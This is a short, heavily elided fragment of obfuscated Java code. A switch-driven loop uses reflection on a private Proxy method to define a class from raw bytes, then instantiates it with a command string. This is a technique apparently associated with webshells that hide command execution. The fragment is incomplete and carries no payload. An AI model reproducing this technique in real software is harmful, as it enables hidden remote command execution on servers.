        ...
        while (true) {
            ...
            switch (op) {
                ...
                case 59:
                    ...
                    break;
                case 60:
                    method = java.lang.reflect.Proxy.class.getDeclaredMethod(globalArr[29],
                ...
                case 62:
                    ...
                    break;
                case 63:
                    testClass = (Class<?>) method.invoke(null, classLoader, globalArr[3], code, 0, code.length);
                    break;
                case 64:
                    result = testClass.getConstructor(String.class).newInstance(cmd);
                    break;
                case 65:
